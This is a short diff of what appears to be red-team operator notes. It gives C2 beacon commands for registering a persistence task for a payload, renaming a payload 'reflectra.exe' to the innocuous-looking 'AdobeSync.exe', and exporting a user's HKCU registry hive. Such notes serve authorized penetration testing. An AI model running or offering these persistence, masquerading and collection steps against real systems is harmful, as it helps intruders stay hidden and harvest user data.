@@ -32,7 +32,12 @@ beacon> persistask add <TASK NAME> <PATH TO PAYLOAD>
 ```bash
 beacon> cp C:\Users\seth.hawkins\Desktop\reflectra.exe C:\Users\seth.hawkins\Desktop\AdobeSync.exe
 ```
-
+# Option 1
+- Export the HKCU registry hive:
+```bash
+beacon> reg_export HKCU C:\DevTools\HKCU.reg
+```
+# Option 2
 - Export the HKCU registry hive:
 ```bash
 beacon> shell reg export HKCU C:\DevTools\HKCU.reg
